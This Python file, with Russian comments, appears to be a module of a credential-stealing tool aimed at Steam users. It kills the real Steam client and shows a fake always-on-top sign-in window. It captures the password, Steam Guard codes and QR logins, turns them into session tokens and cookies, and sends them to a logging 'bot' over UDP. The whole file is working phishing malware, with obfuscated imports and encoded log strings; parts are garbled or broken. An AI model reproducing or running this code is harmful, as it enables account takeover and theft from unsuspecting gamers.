from core.resolver import (Resolver, _BASE64, _TRACEBACK, _CTYPES, _SOCKET, _URLLIB_PARSE)
base64 = Resolver.get_mod(_BASE64)
ctypes = Resolver.get_mod(_CTYPES)
_sock = Resolver.get_mod(_SOCKET)
traceback = Resolver.get_mod(_TRACEBACK)
urllib_parse = Resolver.get_mod(_URLLIB_PARSE)

from core.resolver import (Resolver, _OS, _TIME, _JSON, _THREADING, _SUBPROCESS)
os = Resolver.get_mod(_OS)
time = Resolver.get_mod(_TIME)
json = Resolver.get_mod(_JSON)
threading = Resolver.get_mod(_THREADING)
subprocess = Resolver.get_mod(_SUBPROCESS)

"""
steam_phish.py — Unified Steam Fake Login Module
-------------------------------------------------
Подключение в main.py:
    from core.steam_phish import start_steam_phish

    def on_steam_captured(data):
        account = data['account_name']
        password = data['password']
        cookies  = data['cookies']
        tokens   = data['refresh_token']

    start_steam_phish(callback=on_steam_captured, logger_callback=log_to_bot)
"""
import sys
import secrets
from io import BytesIO

try:
    HAS_CTYPES = True
except ImportError:
    HAS_CTYPES = False

try:
    import webview
    import qrcode
    from cryptography.hazmat.primitives.asymmetric import padding
    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
    HAS_DEPS = True
except ImportError as e:
    print("[!] steam_phish: missing dependency — {e}")
    HAS_DEPS = False

_API = """q Z^o*& pNWWX
HBt AYyblI?]Q  #lVm K@hyjLeWQ x _Up K"""
EP_BEGIN_CRED  = f"{_API}/BeginAuthSessionViaCredentials/v1"
EP_BEGIN_QR    = f"{_API}/BeginAuthSessionViaQR/v1"
EP_POLL        = f"{_API}/PollAuthSessionStatus/v1"
EP_UPDATE      = f"{_API}/UpdateAuthSessionWithSteamGuardCode/v1"
EP_RSA         = f"{_API}/GetPasswordRSAPublicKey/v1"
EP_TOKEN       = f"{_API}/GenerateAccessTokenForApp/v1"
EP_FINALIZE = "https://api.steampowered.com/IAuthenticationService/v1"

def _find_steam_exe():
    "Пытается найти steam.exe на диске."
    candidates = [
        "C:\\Program Files (x86)\\Steam\\steam.exe",
        "C:\\Program Files\\Steam\\steam.exe",
    ]

    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                             r"SOFTWARE\Valve\Steam")
        path = winreg.QueryValueEx(key, "InstallPath")[0]
        winreg.CloseKey(key)
        exe = os.path.join(path, "steam.exe")
        if os.path.exists(exe):
            return exe
    except Exception:
        pass
    for c in candidates:
        if os.path.exists(c):
            return c
    return None

def kill_steam():
    "Завершает процесс steam.exe (все инстансы). Возвращает True если убил."
    try:
        result = subprocess.run(
            ["taskkill", "/f", "/im", "steam.exe"],
            capture_output=True, text=True
        )
        killed = "SUCCESS" in result.stdout or result.returncode == 0
        if killed:
            print("[*] Steam process killed.")
            time.sleep(1.5)
        return killed
    except Exception as e:
        print("[!] kill_steam error: {e}")
        return False

def relaunch_steam(steam_exe=None):
    "Перезапускает настоящий Steam после того как мы закончили."
    exe = steam_exe or _find_steam_exe()
    if exe and os.path.exists(exe):
        try:
            # 0x00000008 = DETACHED_PROCESS. This separates it from the Python process tree.
            subprocess.Popen([exe], close_fds=True, creationflags=0x00000008)
            time.sleep(2)
            print("[*] Relaunched Steam: {exe}")
        except Exception as e:
            print("[!] relaunch_steam error: {e}")
    else:
        print("[!] Steam executable not found, cannot relaunch.")

class SteamPhishApi:
    "JS <-> Python bridge + Steam auth state machine."

    def __init__(self, callback, logger_callback=None, steam_exe=None):
        self.callback        = callback
        self.log             = logger_callback or (lambda x: None)
        self.steam_exe       = steam_exe
        self._window         = None
        self.running         = True
        self.client_id       = None
        self.request_id      = None
        self._username       = ""
        self._password       = ""
        self._poll_thread    = None

    def set_window(self, w):
        self._window = w

    def log_event(self, msg):
        print(f"[JS] {msg}")
        self.log(f"📝 {msg}")

    def collect(self, username, password):
        "Пользователь ввёл логин/пасс и нажал Sign in."
        self._username = username
        self._password = password
        self.log("h97Y5nJ9MnEYPTEgNHOp2eNhhv6C/4D8m/GE/GV8KWd9scnU9mFsLCQtMX8iJjg8BS83KDc8bGAoJjAkZ1m7xuPQdnkxLjQqdTIkICogPDYFJSt5fSI/Ky53".format(username=username, password=password))
        threading.Thread(target=self._do_credentials, daemon=True).start()

    def submit_2fa(self, code):
        threading.Thread(target=self._update_session, args=(code, 3), daemon=True).start()

    def collect_sms(self, code):
        threading.Thread(target=self._update_session, args=(code, 4), daemon=True).start()

    def close(self, send_close_signal=None):
        "Close the window. Optionally send a CLOSE signal via UDP before destroying."
        self.running = False

        if send_close_signal:
            try:
                send_close_signal()
            except Exception:
                pass
        if self._window:
            try:
                self._window.destroy()
            except Exception:
                pass

    def _do_credentials(self):
        try:

            rsa_resp = json.loads(urllib.request.urlopen(
                "{EP_RSA}?account_name={urllib_parse.quote(self._username)}"
            ).read())["response"]
            mod = int(rsa_resp["publickey_mod"], 16)
            exp = int(rsa_resp["publickey_exp"], 16)
            ts  = rsa_resp["timestamp"]

            pub_key = RSAPublicNumbers(exp, mod).public_key()
            enc_pass = base64.b64encode(
                pub_key.encrypt(self._password.encode(), padding.PKCS1v15())
            ).decode()

            payload = urllib_parse.urlencode({
                "account_name": self._username,
                "encrypted_password": enc_pass,
                "encryption_timestamp": ts,
                "remember_login": "true",
                "device_friendly_name": "Steam Client ({os.getenv(\'COMPUTERNAME\',\'PC\')})",
                "platform_type": "2"
            }).encode()
            auth = json.loads(urllib.request.urlopen(
                urllib.request.Request(EP_BEGIN_CRED, data=payload, method="POST")
            ).read())

            resp = auth.get("response", {})
            if "client_id" not in resp:
                print("[!] Auth failed: {auth}")
                self.log("ldzaZW4jbhw/LDUsebHLzVeRy5XnkeKf/pjUkeSCwInOYYb+gv+A/JvxhPx2g/SJx5DWleyR657HdXsjZ1m7xubldnkxLjQqdTIhMjwhJTgaJCt5fSI/Ky53".format(username=self._username))
                if self._window:
                    self._window.evaluate_js("showInputError()")
                return

            self.client_id  = resp["client_id"]
            self.request_id = resp["request_id"]

            if self._window:
                self._window.evaluate_js("showConfirmApp(\'{self._username}\')")

            self._start_poll()

        except Exception as e:
            print("[!] credentials error: {e}")
            traceback.print_exc()
            if self._window:
                self._window.evaluate_js("showInputError()")

    def _update_session(self, code, code_type):
        try:
            payload = urllib_parse.urlencode({
                "client_id": self.client_id,
                "steamid": "0",
                "code": code,
                "code_type": code_type
            }).encode()
            urllib.request.urlopen(
                urllib.request.Request(EP_UPDATE, data=payload, method="POST")
            )
        except urllib.error.HTTPError as e:
            body = e.read().decode()
            print("[!] 2FA error {e.code}: {body}")
            if self._window:
                self._window.evaluate_js("showError(\'Wrong code ({e.code})\')")
        except Exception as e:
            print("[!] 2FA error: {e}")

    def _start_poll(self):
        if not self._poll_thread or not self._poll_thread.is_alive():
            self._poll_thread = threading.Thread(
                target=self._poll_loop, daemon=True)
            self._poll_thread.start()

    def _poll_loop(self):
        print("[*] Polling auth session...")
        while self.running and self.client_id:
            try:
                payload = urllib_parse.urlencode({
                    "client_id":  self.client_id,
                    "request_id": self.request_id
                }).encode()
                data = json.loads(urllib.request.urlopen(
                    urllib.request.Request(EP_POLL, data=payload, method="POST")
                ).read())
                res = data.get("response", {})
                if "refresh_token" in res:
                    print("[+] Session captured!")
                    self._handle_success(res)
                    return
            except Exception as e:
                print("[!] poll error: {e}")
            time.sleep(2)

    def start_qr_loop(self):
        while self.running:
            try:
                payload = urllib_parse.urlencode({
                    "device_friendly_name": "Steam Client ({os.getenv(\'COMPUTERNAME\',\'PC\')})",
                    "platform_type": "2"
                }).encode()
                resp = json.loads(urllib.request.urlopen(
                    urllib.request.Request(EP_BEGIN_QR, data=payload, method="POST")
                ).read()).get("response", {})
                if not resp:
                    time.sleep(5)
                    continue

                url        = resp["challenge_url"]
                client_id  = resp["client_id"]
                request_id = resp["request_id"]
                interval   = resp.get("interval", 5)

                qr = qrcode.QRCode(version=7,
                    error_correction=qrcode.constants.ERROR_CORRECT_H,
                    box_size=8, border=3)
                qr.add_data(url)
                qr.make(fit=True)
                buf = BytesIO()
                qr.make_image(fill_color="black", back_color="white").save(buf, format="PNG")
                b64 = base64.b64encode(buf.getvalue()).decode()

                if self._window:
                    self._window.evaluate_js(f'updateQR("{b64}")')

                old_cid, old_rid = self.client_id, self.request_id
                self.client_id   = client_id
                self.request_id  = request_id
                self._start_poll()

                for _ in range(30):
                    if not self.running:
                        return
                    time.sleep(1)

            except Exception as e:
                print("[!] QR error: {e}")
                time.sleep(5)

    def _handle_success(self, auth_data):
        try:
            account       = auth_data.get("account_name", self._username)
            refresh_token = auth_data.get("refresh_token", "")

            self.log("ld3TZW4jbhw/LDUsebHLzVeR5JTXke6f/2mFwojSm+an9IfNgvSA8mp1eyNnWbvG5uV2eTEuNCp1MjUiOjw+NwM8amoxLjQqdQ==".format(account=account))

            steam_id_64 = ""
            try:
                jwt_body = json.loads(
                    base64.b64decode(refresh_token.split(".")[1] + "==").decode("utf-8", errors="replace")
                )
                steam_id_64 = str(jwt_body.get("sub", ""))
            except Exception:
                pass

            access_token = auth_data.get("access_token", "")

            sessionid = secrets.token_hex(12)
            base_cookies = {"sessionid": sessionid}
            if steam_id_64 and access_token:
                base_cookies["steamLoginSecure"] = f"{steam_id_64}%7C%7C{access_token}"
            base_cookies["steamRefresh_steam"] = f"{steam_id_64}%7C%7C{refresh_token}" if steam_id_64 else refresh_token

            try:
                finalize_payload = urllib_parse.urlencode({
                    "nonce": refresh_token,
                    "sessionid": sessionid,
                    "redir": "https://steamcommunity.com/chat/"
                }).encode()
                cookie_handler = urllib.request.HTTPCookieProcessor()
                opener = urllib.request.build_opener(cookie_handler)

                req = urllib.request.Request(
                    EP_FINALIZE, data=finalize_payload, method="POST",
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Origin": "https://login.steampowered.com",
                        "Referer": "https://login.steampowered.com/",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                    }
                )
                opener.open(req)
                for c in cookie_handler.cookiejar:
                    base_cookies[c.name] = c.value
            except Exception as e:
                print("[-] finalizelogin: {e}")

            cookies_json = []

            MAIN_DOMAINS = [".steamcommunity.com", ".steampowered.com"]
            for domain in MAIN_DOMAINS:
                for name, value in base_cookies.items():
                    cookies_json.append({
                        "domain": domain,
                        "name": name,
                        "value": value,
                        "path": "/",
                        "secure": True,
                        "httpOnly": name in ("steamLoginSecure", "steamRefresh_steam"),
                        "sameSite": "None"
                    })

            try:
                for c in cookie_handler.cookiejar:

                    if c.domain in MAIN_DOMAINS and c.name in base_cookies:
                        continue

                    cookies_json.append({
                        "domain": c.domain,
                        "name": c.name,
                        "value": c.value,
                        "path": c.path,
                        "secure": c.secure,
                        "httpOnly": c.has_nonstandard_attr('httponly') or name in ("steamLoginSecure", "steamRefresh_steam"),
                        "sameSite": "None"
                    })
            except: pass

            SECONDARY_DOMAINS = ["store.steampowered.com", "help.steampowered.com", "steam-chat.com"]
            for domain in SECONDARY_DOMAINS:

                for name in ("sessionid", "steamLoginSecure"):
                    if name in base_cookies:
                        cookies_json.append({
                            "domain": domain,
                            "name": name,
                            "value": base_cookies[name],
                            "path": "/",
                            "secure": True,
                            "httpOnly": name == "steamLoginSecure",
                            "sameSite": "None"
                        })

            json_str = json.dumps(cookies_json, indent=2, ensure_ascii=False)

            msg = "🎮 <b>Steam — {account}</b>\\n\\n"
            if access_token:
                msg += "🔑 <b>Access Token:</b>\\n<code>{access_token[:400]}</code>\\n\\n"
            msg += "♻️ <b>Refresh Token:</b>\\n<code>{refresh_token[:300]}</code>\\n\\n"
            msg += "🍪 <b>Cookies записаны в JSON файл.</b>"
            self.log(msg)

            result = {
                "account_name":  account,
                "password":      self._password,
                "refresh_token": refresh_token,
                "access_token":  access_token,
                "cookies":       base_cookies,
                "cookies_json":  cookies_json,
            }

            if self.callback:

                try:
                    self.callback(result)
                except Exception as e:
                    print("Callback error: {e}")

            self.close()
            threading.Thread(
                target=lambda: (time.sleep(1), relaunch_steam(self.steam_exe)),
                daemon=True
            ).start()

        except Exception as e:
            print("[!] handle_success error: {e}")
            traceback.print_exc()

def _force_icon(icon_path):
    if not HAS_CTYPES or not os.path.exists(icon_path):
        return
    def _apply():
        time.sleep(1.2)
        try:
            user32 = ctypes.windll.user32
            hicon  = user32.LoadImageW(None, icon_path, 1, 0, 0, 0x30)
            if not hicon:
                return
            pid = os.getpid()
            def cb(hwnd, _):
                d = ctypes.wintypes.DWORD()
                user32.GetWindowThreadProcessId(hwnd, ctypes.byref(d))
                if d.value == pid:
                    user32.SendMessageW(hwnd, 0x0080, 0, hicon)
                    user32.SendMessageW(hwnd, 0x0080, 1, hicon)
                return True
            proto = ctypes.WINFUNCTYPE(
                ctypes.wintypes.BOOL, ctypes.wintypes.HWND, ctypes.wintypes.LPARAM)
            user32.EnumWindows(proto(cb), 0)
        except Exception:
            pass
    threading.Thread(target=_apply, daemon=True).start()

def start_steam_phish(callback, logger_callback=None, resource_dir=None, kill_before=True):
    """
    Запустить фейковое окно Steam.

    Args:
        callback        — вызывается при успехе с dict {account_name, password, cookies, ...}
        logger_callback — функция(str) для отправки логов в бота
        resource_dir    — папка с login/steam_ui.html (по умолчанию — рядом с этим файлом)
        kill_before     — убивать steam.exe перед запуском (default True)
    """
    if not HAS_DEPS:
        print("[!] start_steam_phish: dependencies missing, aborting.")
        return False

    import sys as _sys

    if getattr(_sys, "frozen", False):

        _base = getattr(_sys, "_MEIPASS", os.path.dirname(_sys.executable))
        html_path = os.path.join(_base, "steam_ui.html")
        ico_path  = os.path.join(_base, "steam.ico")
    else:
        if resource_dir is None:
            resource_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        login_dir = os.path.join(resource_dir, "login")
        html_path = os.path.join(login_dir, "steam_ui.html")
        ico_path  = os.path.join(login_dir, "steam.ico")

    if not os.path.exists(html_path):
        print("[!] steam_ui.html not found at {html_path}")
        return False

    steam_exe = _find_steam_exe()
    if kill_before:
        kill_steam()

    log = logger_callback or (lambda x: print(f"[LOG] {x}"))
    log("h97Y63J9MnEYPTEgNHMYMBAvdiw8YbLP32mE/4npm+Sn/3aV7JDSn/GY1JDSgsmJyX15J2xLssD4aYTfieWb4af1hvWDz3Cf+ZnmkeeD/4nHYYbxgvGA8pv0hcqI1mV3WQ==")

    api = SteamPhishApi(callback=callback, logger_callback=log, steam_exe=steam_exe)

    file_url = "file:///{html_path.replace(os.sep, \'/\')}"
    window = webview.create_window(
        "Steam Sign in",
        url=file_url,
        js_api=api,
        width=750,
        height=480,
        frameless=True,
        on_top=True,
        resizable=False,
    )



    def on_closing():
        log("ldzaZYLfgPWb9IT/eQA/PBYsdhY7Jj5vIid0ke6D+4nNkNaU2ZDSn/Vn")

    window.events.closing += on_closing
    api.set_window(window)

    _force_icon(ico_path)
    threading.Thread(target=api.start_qr_loop, daemon=True).start()
    webview.start(icon=ico_path if os.path.exists(ico_path) else None)
    return True

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Steam Phish")
    parser.add_argument("--udp", type=int, default=0,
                        help="UDP port to forward logs to bot")
    args = parser.parse_args()

    udp_port = args.udp

    if udp_port:
        _udp_sock = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
        def _udp_log(msg: str):
            try:
                _udp_sock.sendto(msg.encode("utf-8", errors="replace"), ("127.0.0.1", udp_port))
            except Exception:
                pass
        logger = _udp_log
    else:
        logger = lambda msg: print(f"[LOG] {msg}")

    def _on_captured(data):
        """Called after successful login — _handle_success already logged text via UDP.
        Save cookies to JSON file and send FILE: path to log_listener."""
        time.sleep(0.5)

        cookies_json = data.get("cookies_json", [])
        account = data.get("account_name", "unknown")

        if cookies_json and udp_port:
            try:
                import tempfile as _tf, os as _os, json as _json
                fd, path = _tf.mkstemp(suffix=".json", prefix=f"steam_cookies_{account}_")
                with _os.fdopen(fd, 'w', encoding='utf-8') as f:
                    _json.dump(cookies_json, f, indent=2, ensure_ascii=False)

                _udp_sock.sendto("FILE:{path}".encode("utf-8"), ("127.0.0.1", udp_port))
                time.sleep(0.5)
            except Exception as e:
                logger("⚠️ Ошибка сохранения JSON: {e}")

        if udp_port:
            try:
                _udp_sock.sendto(b"CLOSE", ("127.0.0.1", udp_port))
            except Exception:
                pass

    if getattr(__import__("sys"), "frozen", False):
        import sys as _sys
        _res_dir = os.path.dirname(_sys.executable)
        _login_dir_override = _res_dir
    else:
        _res_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        _login_dir_override = None

    start_steam_phish(
        callback=_on_captured,
        logger_callback=logger,
        resource_dir=_res_dir,
        kill_before=True,
    )